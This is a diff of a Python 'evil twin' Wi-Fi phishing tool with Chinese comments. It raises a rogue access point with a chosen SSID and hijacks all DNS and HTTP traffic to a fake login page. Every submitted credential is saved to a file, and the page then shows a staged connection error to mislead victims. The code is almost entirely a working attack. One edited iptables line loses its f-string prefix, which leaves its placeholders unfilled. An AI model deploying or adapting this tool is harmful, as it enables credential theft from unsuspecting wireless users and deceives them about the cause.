@@ -5,9 +5,11 @@ import subprocess
 import argparse
 import shutil
 from http.server import BaseHTTPRequestHandler, HTTPServer
+import urllib.parse
 
 # ================= 配置区域 =================
 AP_IP = "10.0.0.1"
+NETMASK = "255.255.255.0"
 DHCP_RANGE = "10.0.0.10,10.0.0.100,12h"
 WEB_PORT = 80
 TMP_DIR = "/tmp/eviltwin"
@@ -17,64 +19,91 @@ if not os.path.exists(TMP_DIR):
 
 
 def log(msg):
-    t = time.strftime("%H:%M:%S", time.localtime())
-    formatted = f"[{t}] {msg}"
-    print(formatted)
+    """写入日志并打印，方便前端读取"""
+    timestamp = time.strftime("%H:%M:%S", time.localtime())
+    formatted_msg = f"[{timestamp}] {msg}"
+    print(formatted_msg)
     sys.stdout.flush()
-    # 同时写入文件供后端读取
-    with open(f"{TMP_DIR}/eviltwin.log", "a") as f:
-        f.write(formatted + "\n")
+    # 同时写入文件供 debug
+    with open(f"{TMP_DIR}/debug.log", "a") as f:
+        f.write(formatted_msg + "\n")
 
 
-def run_cmd(cmd):
-    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-
-# ================= 钓鱼 Web Server =================
+# ================= 钓鱼 Web 服务器 =================
 class PhishingHandler(BaseHTTPRequestHandler):
     def log_message(self, format, *args):
-        pass  # 禁止打印 HTTP 请求日志以免刷屏
+        pass  # 禁止打印每一个 HTTP 请求，防止刷屏
 
     def do_GET(self):
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
         self.end_headers()
-        try:
-            with open(f"{TMP_DIR}/index.html", 'r', encoding='utf-8') as f:
+
+        template_path = f"{TMP_DIR}/index.html"
+        if os.path.exists(template_path):
+            with open(template_path, 'r', encoding='utf-8') as f:
                 self.wfile.write(f.read().encode('utf-8'))
-        except:
-            self.wfile.write(b"<h1>Loading...</h1>")
+        else:
+            self.wfile.write(b"<h1>Login Page Error: Template not found</h1>")
 
     def do_POST(self):
         try:
-            length = int(self.headers.get('Content-Length', 0))
-            data = self.rfile.read(length).decode('utf-8')
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length).decode('utf-8')
 
-            log(f"[+] 捕获数据: {data}")
+            # 记录捕获到的数据
+            log(f"[+] 捕获到数据: {post_data}")
             with open(f"{TMP_DIR}/captured_creds.txt", "a") as f:
-                f.write(f"{data}\n")
+                f.write(f"{post_data}\n")
 
+            # 简单的跳转或提示
             self.send_response(200)
+            self.send_header('Content-type', 'text/html')
             self.end_headers()
-            # 模拟转圈后报错，让用户以为是网络问题
             self.wfile.write(
-                b"<script>setTimeout(function(){alert('Connection Timeout. Please try again.');}, 1000);</script>")
-        except:
-            pass
+                b"<h1>Verifying... Please wait.</h1><script>setTimeout(function(){alert('Connection Failed. Please try again.');}, 2000);</script>")
+        except Exception as e:
+            log(f"[!] POST Error: {e}")
 
 
 def start_web_server():
     try:
         server = HTTPServer((AP_IP, WEB_PORT), PhishingHandler)
-        log(f"[*] Web Server started on {AP_IP}")
+        log(f"[*] Web Server started on {AP_IP}:{WEB_PORT}")
         server.serve_forever()
     except Exception as e:
         log(f"[!] Web Server Error: {e}")
 
 
-# ================= 网络配置 =================
+# ================= 核心功能函数 =================
+def run_cmd(cmd):
+    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+
+def check_dependencies():
+    """检查并尝试修复环境"""
+    tools = ["hostapd", "dnsmasq"]
+    for tool in tools:
+        if not shutil.which(tool):
+            log(f"[!] 警告: 找不到 {tool}，尝试 apt 安装...")
+            run_cmd(f"apt-get update && apt-get install -y {tool}")
+
+
+def cleanup_network():
+    """清理网络干扰进程"""
+    log("[*] 清理干扰进程 (NetworkManager, wpa_supplicant)...")
+    # 停止常见干扰服务
+    run_cmd("systemctl stop NetworkManager")
+    run_cmd("systemctl stop wpa_supplicant")
+    # 杀掉可能占用端口的进程
+    run_cmd("killall hostapd dnsmasq wpa_supplicant dhclient")
+    # 解锁射频
+    run_cmd("rfkill unblock wlan")
+    run_cmd("rfkill unblock all")
+
+
 def setup_interface(interface):
-    log(f"[*] 初始化网卡 {interface}...")
+    log(f"[*] 配置网卡 {interface}...")
     run_cmd(f"ip link set {interface} down")
     run_cmd(f"ip addr flush dev {interface}")
     run_cmd(f"ip link set {interface} up")
@@ -82,72 +111,68 @@ def setup_interface(interface):
 
 
 def start_dnsmasq(interface):
-    log("[*] 启动 DHCP/DNS 服务...")
+    log("[*] 启动 Dnsmasq (DHCP & DNS)...")
     conf = f"""
 interface={interface}
 dhcp-range={DHCP_RANGE}
 dhcp-option=3,{AP_IP}
 dhcp-option=6,{AP_IP}
 server=8.8.8.8
+log-queries
+log-dhcp
 address=/#/{AP_IP}
 """
-    with open(f"{TMP_DIR}/dnsmasq.conf", "w") as f: f.write(conf)
-    run_cmd("killall dnsmasq")
-    subprocess.Popen(f"dnsmasq -C {TMP_DIR}/dnsmasq.conf -d", shell=True, stdout=subprocess.DEVNULL,
-                     stderr=subprocess.DEVNULL)
+    with open(f"{TMP_DIR}/dnsmasq.conf", "w") as f:
+        f.write(conf)
+
+    proc = subprocess.Popen(f"dnsmasq -C {TMP_DIR}/dnsmasq.conf -d", shell=True, stdout=subprocess.DEVNULL,
+                            stderr=subprocess.DEVNULL)
+    if proc.poll() is not None:
+        log("[!] Dnsmasq 启动失败")
 
 
-def start_hostapd(interface, ssid, channel, band):
-    log(f"[*] 启动 Hostapd | Band: {band} | CH: {channel} | SSID: {ssid}")
+def start_hostapd(interface, ssid, channel):
+    log(f"[*] 启动 Hostapd (SSID: {ssid} / CH: {channel})...")
 
-    # 默认 2.4G 配置
-    hw_mode = "g"
-    ht_capab = "[HT40+][SHORT-GI-40][DSSS_CCK-40]"
-    ieee80211n = "1"
-    ieee80211ac = "0"
-
-    # 5G 配置
-    if band == "5g":
-        hw_mode = "a"
-        # 5G 通常支持 HT40+，部分网卡支持 VHT (802.11ac)
-        ht_capab = "[HT40+][SHORT-GI-40]"
-        # 尝试开启 AC 模式 (如果网卡支持)
-        ieee80211ac = "1"
-
-    # 自动信道 (ACS)
-    channel_config = f"channel={channel}"
-    if str(channel) == "0":
-        log("[*] 启用自动信道选择 (ACS)...")
-        channel_config = "channel=0\nacs_num_scans=1"
-
+    # Hostapd 配置 (最通用配置)
     conf = f"""
 interface={interface}
 driver=nl80211
 ssid={ssid}
-hw_mode={hw_mode}
-{channel_config}
-ieee80211n={ieee80211n}
-ieee80211ac={ieee80211ac}
-wmm_enabled=1
-ht_capab={ht_capab}
+hw_mode=g
+channel={channel}
 macaddr_acl=0
 auth_algs=1
 ignore_broadcast_ssid=0
-country_code=US
+wmm_enabled=0
 """
     with open(f"{TMP_DIR}/hostapd.conf", "w") as f:
         f.write(conf)
 
     # 启动 hostapd 并将日志重定向到文件以便排查
-    with open(f"{TMP_DIR}/hostapd.log", "w") as logf:
-        subprocess.Popen(f"hostapd {TMP_DIR}/hostapd.conf", shell=True, stdout=logf, stderr=subprocess.STDOUT)
+    # 注意：这里不使用 nohup，而是直接由 Python 管理，或者输出到日志文件
+    cmd = f"hostapd {TMP_DIR}/hostapd.conf"
+
+    # 我们使用 Popen 启动，并不阻塞，但捕获输出
+    with open(f"{TMP_DIR}/hostapd.log", "w") as log_file:
+        proc = subprocess.Popen(cmd, shell=True, stdout=log_file, stderr=subprocess.STDOUT)
+
+    # 给它一点时间启动，检查是否立即挂了
+    time.sleep(2)
+    if proc.poll() is not None:
+        log("[!] ❌ Hostapd 启动失败！请查看 /tmp/eviltwin/hostapd.log 排查原因")
+        log("[!] 常见原因: 网卡不支持 AP 模式 / 驱动不兼容 / 之前的进程未清理干净")
+    else:
+        log("[+] Hostapd 正在运行...")
 
 
 def setup_iptables(interface):
-    log("[*] 配置流量劫持 (IPTables)...")
+    log("[*] 配置 IPTables 流量劫持...")
     run_cmd("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    run_cmd("iptables --flush")
+    run_cmd("iptables -t nat --flush")
     run_cmd(
-        f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j DNAT --to-destination {AP_IP}:{WEB_PORT}")
+        "iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j DNAT --to-destination {AP_IP}:{WEB_PORT}")
     run_cmd("iptables -t nat -A POSTROUTING -j MASQUERADE")
 
 
@@ -157,24 +182,24 @@ def main():
     parser.add_argument("--ssid", required=True)
     parser.add_argument("--channel", default="6")
     parser.add_argument("--template", default="<h1>Login</h1>")
-    parser.add_argument("--band", default="2.4g")
     args = parser.parse_args()
 
-    # 写入模板
+    # 0. 写入模板
     with open(f"{TMP_DIR}/index.html", "w", encoding='utf-8') as f:
         f.write(args.template)
 
-    # 清理旧进程
-    run_cmd("killall hostapd dnsmasq wpa_supplicant")
-    run_cmd("rfkill unblock all")
+    # 1. 环境准备
+    check_dependencies()
+    cleanup_network()
 
-    # 启动流程
+    # 2. 启动组件
     setup_interface(args.interface)
     start_dnsmasq(args.interface)
-    start_hostapd(args.interface, args.ssid, args.channel, args.band)
+    start_hostapd(args.interface, args.ssid, args.channel)
     setup_iptables(args.interface)
 
-    # 启动 Web Server (阻塞运行)
+    # 3. 启动 Web Server
+    log(f"[+] 双子热点已就绪。SSID: {args.ssid}")
     start_web_server()
 
 
@@ -182,4 +207,5 @@ if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        pass
+        log("\nStopping...")
+        run_cmd("killall hostapd dnsmasq")
